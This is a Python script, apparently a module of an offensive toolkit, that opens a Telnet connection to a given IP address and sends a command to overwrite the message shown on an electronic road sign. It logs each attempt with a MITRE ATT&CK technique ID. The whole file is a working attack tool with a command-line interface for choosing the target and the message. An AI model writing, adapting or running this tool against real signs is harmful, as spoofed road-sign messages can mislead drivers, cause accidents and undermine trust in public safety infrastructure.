#!/usr/bin/env python3
# modules/attacks/road_sign_message_overwriter.py

import argparse
import socket
import json
import time
import os
from datetime import datetime

LOG_FILE = "results/road_sign_hijack_log.json"
MITRE_TTP = "T1565.002"

def log_event(ip, msg):
    os.makedirs("results", exist_ok=True)
    entry = {
        "timestamp": datetime.utcnow().isoformat(),
        "target_ip": ip,
        "message": msg,
        "ttp": MITRE_TTP
    }
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(entry) + "\n")

def send_telnet_payload(ip, msg):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, 23))
        s.sendall(f"MSG:{msg}\n".encode())
        s.close()
        log_event(ip, msg)
        print(f"[✓] Message '{msg}' sent to sign at {ip} via Telnet")
    except Exception as e:
        print(f"[!] Failed to send: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Overwrite electronic road signs with spoofed messages")
    parser.add_argument("--ip", required=True, help="Target sign IP")
    parser.add_argument("--msg", required=True, help="Message to display")
    args = parser.parse_args()

    send_telnet_payload(args.ip, args.msg)
